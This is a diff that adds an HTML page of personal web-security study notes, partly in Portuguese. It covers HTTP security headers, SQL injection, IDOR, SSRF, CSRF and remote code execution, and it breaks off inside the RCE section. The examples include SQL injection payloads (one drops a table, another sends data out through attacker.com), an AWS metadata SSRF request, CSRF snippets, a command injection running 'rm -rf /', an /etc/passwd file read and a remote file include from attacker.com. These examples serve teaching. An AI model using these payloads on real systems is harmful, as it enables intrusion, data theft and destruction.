@@ -1,0 +1,1612 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Security Vulnerability Scenarios with HTTP Headers</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800,900" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="css/style.css">
+  </head>
+  <style>
+    .pdf-container {
+      position: relative;
+      width: 100%;
+      height: 0;
+      padding-bottom: 75%; /* Adjust this for aspect ratio */
+    }
+  
+    .pdf-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        color: #333;
+    }
+    header {
+        background-color: #333;
+        color: white;
+        padding: 10px 20px;
+        text-align: center;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 20px 0;
+        background-color: white;
+    }
+    th, td {
+        padding: 12px;
+        border: 1px solid #ddd;
+        text-align: left;
+    }
+    th {
+        background-color: #f2f2f2;
+    }
+    .example {
+        font-family: monospace;
+        color: #d9534f;
+    }
+    .faq {
+        width: 100%;
+        margin: 20px auto;
+      }
+
+      .q {
+        background-color: #f9f9f9;
+       
+        cursor: pointer;
+        font-weight: normal !important;
+      }
+
+      .q b,
+      .q strong {
+        font-weight: normal !important;
+        font-style: normal !important;
+      }
+      .q::first-letter {
+        font-size: 1.5em;
+      }
+
+      .a {
+        display: none;
+        padding: 10px;
+        background-color: #f9f9f9;
+        margin: 5px 0;
+        border: 3px solid #2fc036;
+      }
+
+      .q:hover {
+        background-color: #13c307;
+      }
+  </style>
+  <body>
+  
+    <div class="wrapper d-flex align-items-stretch">
+      <nav id="sidebar">
+				<div class="custom-menu">
+					<button type="button" id="sidebarCollapse" class="btn btn-primary">
+	          <i class="fa fa-bars"></i>
+	          <span class="sr-only">Toggle Menu</span>
+	        </button>
+        </div>
+				<div class="p-4 pt-5">
+          <ul class="list-unstyled components mb-5">
+
+            <li class="active">
+	            <a href="#cyberArticles" data-toggle="collapse" aria-expanded="false" class="dropdown-toggle" style="color: rgb(255, 215, 73);">About me</a>
+	            <ul class="list-unstyled" id="cyberArticles">
+                <li>
+                  <li><a href="Edu_WExperience.html">Education / Work Experience / Projects</a></li>
+                  <li><a href="General_Questions.html">General Questions</a></li>
+                  <li><a href="Tools.html">Tools (AS/Pentest)</a></li>
+                  <li><a href="my_attacks.html">My Attacks Examples</a></li>
+                </li>
+	            </ul>
+	          </li>
+
+
+
+	        <ul class="list-unstyled components mb-5">
+	          <li class="active">
+	            <a href="#cyberConcepts" data-toggle="collapse" aria-expanded="false" class="dropdown-toggle"  style="color: rgb(8, 214, 12);">Cyber Concepts</a>
+              <ul class=" list-unstyled" id="cyberConcepts">
+
+                <li><a href="Concepts.html">Concepts</a></li>
+                <li><a href="web_vulnerabilities.html">Web Vulnerabilities</a></li>
+                <li><a href="G-Cloud.html">G-Cloud</a></li>
+                <li><a href="ISO27001.html">ISO 27001</a></li>
+                <li><a href="Software_Arquiteturas.html">Software</a></li>
+
+                <li><a href="Others.html">Others</a></li>
+
+
+            </ul>
+	          </li>
+
+            <li class="active">
+	            <a href="#cyberConcepts" data-toggle="collapse" aria-expanded="false" class="dropdown-toggle" style="color: rgb(199, 223, 144);">Active Directory</a>
+              <ul class="list-unstyled" id="cyberConcepts">
+                <li><a href="AD Components.html">AD Components</a></li>
+                <li><a href="AD_Authentication.html">AD Authentication</a></li>
+                <li><a href="AD_LDAP.html">AD LDAP/LDAPS</a></li>
+                <li><a href="AD_Attacks.html">AD Attacks</a></li>
+            </ul>
+	          </li>
+
+            
+	        </ul>
+    	</nav>
+        <!-- Page Content -->
+        <div id="content" class="p-4 p-md-5 pt-5">
+            <div class="container my-5">
+              <div class="q"><strong style="color: #d9534f;">HTTP Headers</strong></div>
+              <div class="a">
+                      
+                <table>
+                  <thead>
+                      <tr>
+                          <th>HTTP Security Header</th>
+                          <th>Definition</th>
+                          <th>Vulnerabilities Addressed</th>
+                          <th>Example</th>
+                      </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Same-Origin Policy (SOP)</td>
+                      <td>It is an automatic browser security rule that prevents scripts loaded from one origin (domain, protocol, and port) from accessing content from a different origin.</td>
+                      <td>Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Data leakage</td>
+                      <td>Automatically enforced by browsers (not a header)</td>
+                  </tr>
+                      <tr>
+                          <td>Access-Control-Allow-Origin</td>
+                          <td>Defines which domains can access the resources of the site (CORS).</td>
+                          <td>Cross-Site Request Forgery (CSRF), Data leakage</td>
+                          <td class="example">Access-Control-Allow-Origin: https://trusted.com</td>
+                      </tr>
+                      <tr>
+                          <td>Strict-Transport-Security (HSTS)</td>
+                          <td>Instructs browsers to always use HTTPS, even if the user attempts to access a site via HTTP.</td>
+                          <td>Man-in-the-Middle (MITM) attacks, downgrade attacks</td>
+                          <td class="example">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</td>
+                      </tr>
+                      <tr>
+                          <td>Content-Security-Policy (CSP)</td>
+                          <td>Defines which content is allowed to load on the site, mitigating XSS and data injection attacks.</td>
+                          <td>Cross-Site Scripting (XSS), Data injection attacks</td>
+                          <td class="example">Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none'; style-src 'self'; img-src 'self' https://trusted-image-source.com</td>
+                      </tr>
+                      <tr>
+                          <td>X-Frame-Options</td>
+                          <td>Prevents the page from being displayed in an iframe to mitigate clickjacking attacks.</td>
+                          <td>Clickjacking</td>
+                          <td class="example">X-Frame-Options: DENY</td>
+                      </tr>
+                      <tr>
+                          <td>X-Content-Type-Options</td>
+                          <td>Prevents browsers from interpreting files as a different MIME type to avoid attacks like MIME sniffing.</td>
+                          <td>Content Type Confusion, MIME Sniffing</td>
+                          <td class="example">X-Content-Type-Options: nosniff</td>
+                      </tr>
+                      <tr>
+                          <td>X-XSS-Protection</td>
+                          <td>Enables the cross-site scripting (XSS) filter built into most browsers, preventing reflective XSS attacks.</td>
+                          <td>Cross-Site Scripting (XSS)</td>
+                          <td class="example">X-XSS-Protection: 1; mode=block</td>
+                      </tr>
+                      <tr>
+                          <td>Referrer-Policy</td>
+                          <td>Controls what information is sent in the referrer header when navigating between pages.</td>
+                          <td>Privacy leak, Information disclosure</td>
+                          <td class="example">Referrer-Policy: no-referrer, no-referrer-when-downgrade, origin</td>
+                      </tr>
+                      <tr>
+                          <td>Feature-Policy (Permissions-Policy)</td>
+                          <td>Controls which features and APIs the browser can access, such as camera, microphone, etc.</td>
+                          <td>Privacy leakage, unauthorized feature access</td>
+                          <td class="example">Feature-Policy: camera 'none'; microphone 'self'; geolocation 'self'</td>
+                      </tr>
+                      <tr>
+                          <td>Cache-Control</td>
+                          <td>Controls caching behavior for browsers, preventing sensitive data from being stored in cache.</td>
+                          <td>Sensitive data exposure, Caching vulnerabilities</td>
+                          <td class="example">Cache-Control: no-store, no-cache, must-revalidate, private</td>
+                      </tr>
+                      <tr>
+                          <td>Content-Type</td>
+                          <td>Indicates the type of content in the response to prevent content type confusion.</td>
+                          <td>Injection attacks, MIME type spoofing</td>
+                          <td class="example">Content-Type: text/html; charset=UTF-8</td>
+                      </tr>
+                      <tr>
+                          <td>X-Permitted-Cross-Domain-Policies</td>
+                          <td>Controls cross-domain Flash and PDF policies to avoid malicious domain access.</td>
+                          <td>Cross-domain Flash vulnerabilities</td>
+                          <td class="example">X-Permitted-Cross-Domain-Policies: none</td>
+                      </tr>
+                      <tr>
+                          <td>Expect-CT</td>
+                          <td>Monitors public key certificates and ensures only valid certificates are used, preventing MITM attacks.</td>
+                          <td>Man-in-the-Middle (MITM) attacks</td>
+                          <td class="example">Expect-CT: max-age=86400, report-uri="https://example.com"</td>
+                      </tr>
+                  </tbody>
+              </table>
+              
+              </div>
+
+              <br>
+              
+                <h4>Server-Side Vulnerabilities</h4>
+                <p>Server-Side: Affects the server, leading to data breaches, unauthorized access, and system compromise.</p>
+                
+                <div class="q">SQL Injection (SQLi)</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>: Inserting malicious SQL queries to manipulate the database.<br>
+
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+                  <ul>
+                    <li><strong>User Inputs</strong>: Test forms (login, search, etc.) com caracteres como `'`, `"`, `--`, `;`.</li>
+                    <li><strong>URL Parameters</strong>: Tenta payloads SQL em URLs, ex: `?id=1' OR '1'='1`.</li>
+                    <li><strong>HTTP Headers</strong>: Injeta em headers como `User-Agent` ou `Cookie`.</li>
+                    <li><strong>Error Messages</strong>: Procura mensagens de erro SQL visíveis.</li>
+                    <li><strong>Backend Logs</strong>: Revisa logs para queries suspeitas.</li>
+                    <li><strong>Tools</strong>: Usa ferramentas como Burp Suite, ZAP, SQLmap.</li>
+                    <li><strong>Source Code</strong>: Verifica uso inseguro de SQL com concatenação direta.</li>
+                    <li><strong>DB Behavior</strong>: Observa respostas lentas ou erros incomuns após injeção.</li>
+                  </ul>
+
+                
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <ul>
+                    <li><strong>Prepared Statements</strong>: Use queries with placeholders to separate logic from data.</li>
+                    <li><strong>Input Validation</strong>: Only accept expected input types (e.g., numbers, emails).</li>
+                    <li><strong>Stored Procedures</strong>: Use precompiled SQL routines instead of dynamic queries.</li>
+                    <li><strong>Escape Input</strong>: Escape special characters if dynamic SQL is needed.</li>
+                    <li><strong>Least Privilege</strong>: Give the app only the DB permissions it truly needs.</li>
+                    <li><strong>WAF</strong>: Use a Web Application Firewall to block SQLi attempts.</li>
+                    <li><strong>ORM Libraries</strong>: Use secure ORM tools that handle queries properly.</li>
+                    <li><strong>Error Handling</strong>: Hide DB error messages from users.</li>
+                    <li><strong>Security Testing</strong>: Regularly audit and test for vulnerabilities.</li>
+                  </ul>
+                  
+
+                  <h5 style="background-color: #eccdcf;">Example</h5>
+
+
+                  <strong style="color:rgb(236, 111, 9)">In-Band</strong>
+                  In-Band SQL Injection happens when the attacker sends a payload and receives results directly in the application's response.
+                  <br>
+<strong style="color:rgb(0, 112, 192)">Error based</strong>
+ In Error-Based, errors are used to reveal sensitive information.
+ <p>Force database errors to leak information through application error messages.</p>
+
+ <ul>
+  <li><code>?id=1' AND (SELECT 1/0)-- -</code> (forces divide by zero error)</li>
+  <li><code>?id=1' AND (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)-- -</code> (forces duplicate entry error)</li>
+</ul>
+
+<strong style="color:rgb(0, 112, 192)">Union based</strong>
+<p>uses the UNION operator to combine the results of malicious queries with the legitimate ones, displaying attacker-chosen data in the web page response.</p>
+
+<p><strong>Retrieving data from other database tables</strong></p>
+<p>Nº of columns?</p>
+<pre>' ORDER BY 3--</pre>
+<p>Number of columns = N-1</p>
+
+<p>OR</p>
+<pre>' UNION SELECT NULL,NULL--</pre>
+
+<p>If database is ORACLE:</p>
+<pre>' UNION SELECT NULL FROM DUAL--</pre>
+<p>There is a built-in table called <strong>dual</strong></p>
+
+<p><strong>Data types</strong></p>
+<ul>
+  <li>After we get the number of columns we can check the data type</li>
+  <li><code>' UNION SELECT NULL,'a',NULL,NULL--</code></li>
+</ul>
+
+<ul>
+  <li>Retrieve multiple pieces of data at once</li>
+  <li>No need to cause application errors</li>
+</ul>
+
+<strong style="color:rgb(236, 111, 9)">Blind</strong>
+<p>Blind SQL Injection is when <span style="color:rgb(192, 0, 0)">no data </span>is directly returned in the HTTP response. Instead, the attacker infers information based on differences in page behavior (Boolean-Based) or response time (Time-Based).</p>
+
+
+<strong style="color:rgb(0, 112, 192)">Boolean based</strong>
+Observe differences in page behavior (e.g., page content changes or not).
+<ul>
+  <li>
+    <strong>1st example:</strong>
+    <pre>' AND 1=1--</pre>
+    <p>Always true; app responds normally</p>
+    <pre>' AND 1=2--</pre>
+    <p>False; different behavior</p>
+  </li>
+  <li>
+    <strong>2nd example:</strong>
+    <p>Testing username char by char</p>
+    <pre>AND SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1) = 'a'--</pre>
+    <ul>
+      <li>SUBSTRING('admin', 1, 1) → 'a'</li>
+      <li>SUBSTRING('admin', 2, 2) → 'dm'</li>
+    </ul>
+  </li>
+  <li>
+    <strong>3rd example:</strong>
+    <pre>' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)--</pre>
+  </li>
+</ul>
+
+<strong style="color:rgb(0, 112, 192)">Time based</strong>
+Observe differences in response time (delays) to infer the answer
+<pre>' AND IF(SUBSTRING((SELECT user()), 1, 1) = 'r', SLEEP(5), 0)--</pre>
+<p>If the first char of the current user is "r", the server delays 5 seconds</p>
+
+<strong style="color:rgb(0, 192, 54)"> Boolean *Error* Inferential (Blind) SQL Injection </strong>
+Outro tipo
+<p> injecting "AND 1=1" and "AND 1=2" (for example) will return the same response!</p>
+<p>The trick is to purposefully cause a database error when a condition we want to test is true, and hope that error propagates back to the response somehow (e.g. a 500 Internal Server error).
+
+  Many ways to do this, but most use a CASE expression and some divide by zero if the condition is true. For example: AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)</p>
+
+<strong style="color:rgb(236, 111, 9)">Out-of-Band (OOB)</strong>
+<p><strong>Definition:</strong> Results aren’t returned in the app’s response, but the DB contacts an attacker-controlled server</p>
+<pre>'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\abc'))--</pre>
+
+<strong style="color:rgb(236, 111, 9)">Second-order</strong>
+<p><strong>First-Order SQL Injection</strong>: Executes immediately</p>
+<p><strong>Second-Order SQL Injection</strong>: <span style="color:rgb(0, 176, 80)">First</span> the payload is stored in the DB and <span style="color:rgb(0, 176, 80)">then</span> executed in another query.</p>
+
+<table border="1" cellpadding="6">
+  <thead>
+    <tr>
+      <th>Feature</th>
+      <th>First-Order SQLi</th>
+      <th>Second-Order SQLi</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Executes immediately?</td>
+      <td>✅ Yes</td>
+      <td>❌ No (delayed)</td>
+    </tr>
+    <tr>
+      <td>Stored in DB?</td>
+      <td>❌ Usually not</td>
+      <td>✅ Yes</td>
+    </tr>
+    <tr>
+      <td>Requires multiple steps?</td>
+      <td>❌ Single step</td>
+      <td>✅ Two steps (store + trigger)</td>
+    </tr>
+    <tr>
+      <td>Harder to detect?</td>
+      <td>❌ Easier</td>
+      <td>✅ Harder</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Login Example:</strong></p>
+<pre>
+username: joao
+password: 123'); DROP TABLE users;-- 
+</pre>
+
+<p>Later, if login is with:</p>
+<pre>
+username=joao 
+password=123
+</pre>
+
+<p>The query becomes:</p>
+<pre>
+SELECT * FROM users WHERE username = 'joao' AND password = '123'); DROP TABLE users;--
+</pre>
+
+<p>➡️ This will drop the users table.</p>
+
+<strong style="color:rgb(236, 111, 9)">After finding SQLi, we can extract:</strong>
+<ul>
+  <li>Database version</li>
+  <li>Table names</li>
+</ul>
+
+
+
+                  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                  <ul>
+                    <li><strong>Content-Security-Policy (CSP)</strong>: 
+                      <ul>
+                        <li><strong>Purpose</strong>: Principalmente protege contra XSS, mas pode evitar que payloads maliciosos sejam executados no navegador, dificultando ataques combinados com SQLi.</li>
+                      </ul>
+                    </li>
+                  
+                    <li><strong>X-Content-Type-Options: nosniff</strong>:
+                      <ul>
+                        <li><strong>Purpose</strong>: Impede que o browser "adivinhe" o tipo de conteúdo e execute scripts maliciosos, o que pode ser explorado junto com SQLi.</li>
+                      </ul>
+                    </li>
+                  
+                    <li><strong>X-Frame-Options: DENY</strong>:
+                      <ul>
+                        <li><strong>Purpose</strong>: Previne clickjacking, que pode ser usado para enganar usuários e executar payloads SQLi via ações forjadas.</li>
+                      </ul>
+                    </li>
+                  
+                    <li><strong>Strict-Transport-Security (HSTS)</strong>:
+                      <ul>
+                        <li><strong>Purpose</strong>: Força HTTPS, garantindo que a comunicação com o servidor seja cifrada, protegendo contra MITM que poderiam injetar SQLi via manipulação do tráfego.</li>
+                      </ul>
+                    </li>
+                  
+                    <li><strong>Referrer-Policy: no-referrer</strong>:
+                      <ul>
+                        <li><strong>Purpose</strong>: Impede que parâmetros com payloads SQLi nos links sejam enviados como "referrer" para outros sites.</li>
+                      </ul>
+                    </li>
+                  </ul>
+                  
+                </div>
+
+
+                <div class="q">Insecure Direct Object References (IDOR)</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>Occurs when an application exposes internal object references (like database IDs, file names, etc.) without proper access control, allowing attackers to manipulate them to access unauthorized data.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <p>Detected during manual or automated testing of APIs or URLs. Look for predictable parameters (e.g., user IDs, invoice numbers) and try changing them to access unauthorized resources. Tools like Burp Suite, OWASP ZAP, or custom scripts help identify IDOR vulnerabilities.</p>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li>Always perform authorization checks on the server side for every access request.</li>
+    <li>Use indirect references (e.g., hashed or random IDs) instead of exposing raw object IDs.</li>
+    <li>Implement Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC).</li>
+    <li>Use centralized access control mechanisms.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li>ID manipulation in URLs (REST APIs)</li>
+    <li>Form parameter tampering</li>
+    <li>Cookie manipulation</li>
+    <li>Direct access to file names or paths</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <pre>https://example.com/user/12345 → Change to /user/12346 to access another user's data (if unauthorized, it's IDOR)</pre>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <p>There is no specific HTTP header that prevents IDOR directly. However, related headers like <code>Authorization</code> are used to enforce proper access control. The mitigation relies on server-side logic, not headers.</p>
+</div>
+
+
+<div class="q">Server-Side Request Forgery (SSRF)</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>SSRF occurs when an attacker tricks a server into making unauthorized requests to internal or external systems. This typically happens when user-supplied URLs are fetched by the server without proper validation.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <p>Detected through input fields or APIs where the server makes requests to URLs provided by the user. Monitor for unexpected outbound requests, internal IP access, or DNS lookups. Tools like Burp Suite and SSRF-specific payloads are commonly used for testing.</p>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li>Validate and sanitize all user-supplied URLs.</li>
+    <li>Use a whitelist of allowed domains/IPs.</li>
+    <li>Block internal IP ranges (e.g., 127.0.0.1, 169.254.169.254).</li>
+    <li>Disable unused URL-fetching functionality.</li>
+    <li>Implement network-layer protections like firewalls and egress filters.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li>Basic SSRF – access to internal services</li>
+    <li>Blind SSRF – no immediate feedback but can observe side effects (e.g., DNS lookup)</li>
+    <li>Out-of-Band SSRF – uses external channels (e.g., DNS, HTTP callbacks)</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <pre>POST /api/fetch
+{
+  "url": "http://169.254.169.254/latest/meta-data/"
+}</pre>
+  <p>If the server fetches that internal AWS metadata URL, attacker may gain access to sensitive data like credentials.</p>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <p>No specific HTTP header prevents SSRF directly. However, defense-in-depth includes using <code>Content-Security-Policy</code> to limit what can be loaded from external sources, and network policies to restrict internal access.</p>
+</div>
+
+
+                <div class="q">Cross-Site Request Forgery (CSRF)</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>Attacker induces <span style="color:rgb(0, 112, 192)">users to perform actions</span> that they do not intend to perform.
+                  <ul>
+                    <li>The victim is already authenticated on the target website.</li>
+                    <li>The attacker creates a malicious web page or email containing a request to the vulnerable site (e.g., hidden form submission or AJAX request).</li>
+                    <li>The victim visits the malicious page while still logged into the vulnerable site.</li>
+                    <li>The victim’s browser automatically includes cookies/session info when making the request.</li>
+                    <li>The vulnerable site processes the request as if it were legitimate, performing the attacker’s intended action.</li>
+                  </ul>
+                  
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+                  <ul>
+                    <li><strong>Forms Without Tokens</strong>: 
+                      <ul><li>Check if sensitive forms (e.g., password change, money transfer) lack CSRF tokens.</li></ul>
+                    </li>
+                  
+                    <li><strong>Token Reuse or Missing Validation</strong>: 
+                      <ul><li>Verify if the token is the same across sessions or isn't validated server-side.</li></ul>
+                    </li>
+                  
+                    <li><strong>State-Changing GET Requests</strong>: 
+                      <ul><li>Check if actions like logout, delete, or update use GET requests instead of POST with tokens.</li></ul>
+                    </li>
+                  
+                    <li><strong>Missing SameSite Attribute in Cookies</strong>: 
+                      <ul><li>Inspect cookies to see if <code>SameSite</code> is not set to <code>Strict</code> The cookie is **not** sent with cross-site requests, preventing CSRF entirely. Only sent if the request originates from the same site. or <code>Lax</code> The cookie is sent with **top-level navigations** (e.g., when a user clicks a link) but **not** with cross-site sub-requests (like images or forms).</li></ul>
+                    </li>
+                  
+                    <li><strong>No Origin or Referer Header Check</strong>: 
+                      <ul><li>Test if the server fails to validate the <code>Origin</code> or <code>Referer</code> header on sensitive actions.</li></ul>
+                    </li>
+                  
+                    <li><strong>Automated Tools</strong>: 
+                      <ul><li>Use tools like Burp Suite Pro (Scanner) to detect missing CSRF protections.</li></ul>
+                    </li>
+                  </ul>
+
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <ul>
+                    <li><strong>Use CSRF Tokens</strong>: 
+                      <ul><li>Include unique, unpredictable tokens in every state-changing request and verify them server-side.</li></ul>
+                    </li>
+                  
+                    <li><strong>SameSite Cookie Attribute</strong>: 
+                      <ul><li>Set cookies with <code>SameSite=Lax</code> or <code>SameSite=Strict</code> to prevent them from being sent in cross-site requests.</li></ul>
+                    </li>
+                  
+                    <li><strong>Validate Origin and Referer Headers</strong>: 
+                      <ul><li>Check the <code>Origin</code> or <code>Referer</code> headers to ensure requests come from trusted sources.</li></ul>
+                    </li>
+                  
+                    <li><strong>Use Secure HTTP Methods</strong>: 
+                      <ul><li>Avoid using <code>GET</code> for actions that change state. Use <code>POST</code>, <code>PUT</code>, or <code>DELETE</code> with proper protections.</li></ul>
+                    </li>
+                  
+                    <li><strong>Implement Same-Origin Policy</strong>: 
+                      <ul><li>Ensure your web app enforces strict same-origin rules for sensitive actions.</li></ul>
+                    </li>
+                  
+                    <li><strong>Multi-Factor Authentication (MFA)</strong>: 
+                      <ul><li>Add an extra layer of identity verification to minimize the impact of a CSRF attack.</li></ul>
+                    </li>
+                  </ul>
+                  
+
+                  <h5 style="background-color: #eccdcf;">Types</h5>
+
+                  <ul>
+                    <li><strong>Stored CSRF</strong>: 
+                      <ul>
+                        <li>The CSRF payload is stored on the server (e.g., in a comment or profile field) and automatically executed when a user accesses that content.</li>
+                      </ul>
+                    </li>
+                  
+                    <li><strong>Reflected CSRF</strong>: 
+                      <ul>
+                        <li>The CSRF payload is embedded in a malicious URL, and executed immediately when the victim clicks the link.</li>
+                      </ul>
+                    </li>
+                  
+                    <li><strong>DOM-based CSRF</strong>: 
+                      <ul>
+                        <li>Uses JavaScript in the client-side (DOM) to craft and send malicious requests without user interaction.</li>
+                      </ul>
+                    </li>
+                  </ul>
+                  
+                  <h5 style="background-color: #eccdcf;">Example</h5>
+                  <ul>
+  <li><strong>Stored CSRF</strong>:
+    <ul>
+      <li><em>Example:</em> An attacker injects this in a profile bio field:
+        <pre>&lt;img src="http://victim-site.com/delete-account" /&gt;</pre>
+        <p>When an admin views the profile, the request is triggered.</p>
+      </li>
+    </ul>
+  </li>
+
+  <li><strong>Reflected CSRF</strong>:
+    <ul>
+      <li><em>Example:</em> A malicious link sent to the user:
+        <pre>http://victim-site.com/transfer?amount=1000&to=attacker</pre>
+        <p>If the user is authenticated, just clicking the link executes the transfer.</p>
+      </li>
+    </ul>
+  </li>
+
+  <li><strong>DOM-based CSRF</strong>:
+    <ul>
+      <li><em>Example:</em> A malicious script on a third-party site:
+        <pre>
+&lt;script&gt;
+  var img = new Image();
+  img.src = "http://victim-site.com/update-email?email=attacker@example.com";
+&lt;/script&gt;
+        </pre>
+        <p>The script runs in the victim's browser and sends the request without interaction.</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+                </div>
+
+
+                <div class="q">Remote Code Execution (RCE)</div>
+                <div class="a">
+                <h5 style="background-color: #eccdcf;">Definition</h5>
+                Attacker executes arbitrary code on the server.
+                <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+                <ul>
+                  <li><strong>Input Validation Testing</strong>: Test user inputs for unsafe functions like `eval()`, `exec()`, or `system()` that could lead to code execution.</li>
+                  <li><strong>Command Injection Testing</strong>: Try injecting shell commands (`;`, `&&`, `|`) into input fields (URLs, forms) to check if the app executes them.</li>
+                  <li><strong>File Upload Testing</strong>: Upload files with executable extensions (e.g., `.php`, `.exe`) to see if they get executed on the server.</li>
+                  <li><strong>Remote File Inclusion (RFI) Testing</strong>: Check if the application includes remote files via URL input (e.g., `http://attacker.com/malicious-file.php`).</li>
+                  <li><strong>Deserialization Testing</strong>: Send manipulated serialized data to check for insecure deserialization that could lead to RCE.</li>
+                  <li><strong>URL and Parameter Fuzzing</strong>: Fuzz URL parameters, headers, and other input points for unexpected behavior or code execution.</li>
+                  <li><strong>Exploit Known Vulnerabilities</strong>: Look for CVEs (Common Vulnerabilities and Exposures) related to RCE in the app's tech stack.</li>
+                  <li><strong>File Permission Misconfigurations</strong>: Check if the server has improper file permissions, allowing untrusted files to be executed.</li>
+                  <li><strong>Web Shell Upload</strong>: Try uploading a web shell (e.g., a PHP or ASP file) to test if the server allows execution.</li>
+                  <li><strong>Web Application Firewall (WAF) Evasion</strong>: Test if the WAF is effectively blocking payloads designed to exploit RCE vulnerabilities.</li>
+                </ul>
+
+                
+
+                <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                <ul>
+                  <li><strong>Input Validation and Sanitization</strong>: Always validate and sanitize user inputs. Avoid using functions like `eval()`, `exec()`, and `system()` with untrusted data.</li>
+                  <li><strong>Use Parameterized Queries</strong>: Prevent injection attacks by using parameterized queries or prepared statements, especially in database interactions.</li>
+                  <li><strong>Least Privilege</strong>: Ensure the application runs with the minimum necessary privileges, preventing unauthorized execution of code.</li>
+                  <li><strong>Disable Dangerous Functions</strong>: Disable or restrict the use of dangerous PHP functions (`eval()`, `shell_exec()`, etc.) in the server configuration.</li>
+                  <li><strong>File Upload Restrictions</strong>: Implement strict validation for file uploads, ensuring that only safe file types are allowed and that they cannot be executed on the server.</li>
+                  <li><strong>Secure Deserialization</strong>: Avoid deserializing untrusted data, or implement checks to ensure data is valid and safe before deserialization.</li>
+                  <li><strong>Patch and Update Software Regularly</strong>: Keep all software components (web servers, frameworks, libraries) up to date to fix known vulnerabilities.</li>
+                  <li><strong>Web Application Firewall (WAF)</strong>: Use a WAF to detect and block exploit attempts targeting RCE vulnerabilities.</li>
+                  <li><strong>Security Headers</strong>: Implement security headers such as `Content-Security-Policy` (CSP), `X-Content-Type-Options`, and `X-XSS-Protection` to reduce attack surface.</li>
+                  <li><strong>Logging and Monitoring</strong>: Continuously monitor logs for abnormal behaviors, such as unusual file executions or system command invocations.</li>
+                </ul>
+
+                <h5 style="background-color: #eccdcf;">Types</h5>
+                <ul>
+                  <li><strong>Command Injection</strong>: Exploits unsanitized input passed to the system shell, allowing arbitrary commands.</li>
+                  <li><strong>File Inclusion Vulnerabilities</strong>:
+                    <ul>
+                      <li><strong>LFI</strong>: Includes local files, possibly executing scripts.</li>
+                      <li><strong>RFI</strong>: Includes remote files, potentially running malicious code.</li>
+                    </ul>
+                  </li>
+                  <li><strong>Deserialization Vulnerabilities</strong>: Allows injection of malicious objects during deserialization.</li>
+                  <li><strong>Server-Side Template Injection (SSTI)</strong>: Injects malicious template code executed on the server.</li>
+                  <li><strong>File Upload Vulnerabilities</strong>: Lets users upload files with executable code (e.g., PHP web shells).</li>
+                  <li><strong>Buffer Overflow</strong>: Overwrites memory, enabling code execution.</li>
+                  <li><strong>SQL Injection (RCE via SQL)</strong>: SQL injections that execute system commands.</li>
+                  <li><strong>XSS Leading to RCE</strong>: Escalates XSS to execute code remotely.</li>
+                  <li><strong>Privilege Escalation via RCE</strong>: Uses vulnerabilities to gain higher access rights and execute code.</li>
+                  <li><strong>Zero-Day Exploits</strong>: Exploits unknown vulnerabilities leading to code execution.</li>
+                </ul>
+                
+
+                <h5 style="background-color: #eccdcf;">Example</h5>
+                <ul>
+                  <li><strong>Command Injection</strong>: 
+                    <ul>
+                      <li>Example: <code>http://example.com/page?input=;rm -rf /</code> — Allows the attacker to run arbitrary commands, such as deleting files on the server.</li>
+                    </ul>
+                  </li>
+                  <li><strong>File Inclusion Vulnerabilities</strong>:
+                    <ul>
+                      <li><strong>Local File Inclusion (LFI)</strong>: 
+                        <ul>
+                          <li>Example: <code>http://example.com/page?file=../../etc/passwd</code> — Includes local files like system files that can leak sensitive information.</li>
+                        </ul>
+                      </li>
+                      <li><strong>Remote File Inclusion (RFI)</strong>: 
+                        <ul>
+                          <li>Example: <code>http://example.com/page?file=http://attacker.com/maliciousfile.php</code> — Allows an attacker to include and execute malicious code hosted on an external server.</li>
+                        </ul>
